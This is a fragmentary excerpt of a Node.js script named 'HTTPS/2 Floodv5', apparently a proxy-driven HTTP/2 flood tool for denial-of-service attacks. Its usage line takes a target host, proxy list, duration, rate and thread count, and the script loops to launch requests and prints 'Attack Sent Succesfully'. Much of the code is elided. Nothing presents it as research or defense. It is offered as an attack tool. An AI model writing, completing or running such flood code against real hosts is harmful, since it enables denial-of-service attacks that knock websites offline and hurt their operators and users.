...
if (process.argv.length < 8){
	console.log('	');
    console.log('		HTTPS/2 Floodv5 (HTTPS Only)'.green.bold);
	console.log('	');
    console.log('Usage: node Floodv5 <GET/HEAD> <host> <proxies> <duration> <rate<64> <thread(1-3)>	');
...
const dateObj = new Date();
    for(var bb=0;bb<process.argv[6];bb++) {
	 ...
	 console.log(color('red', 'blue')('Attack Sent Succesfully'));
    setTimeout(() => {
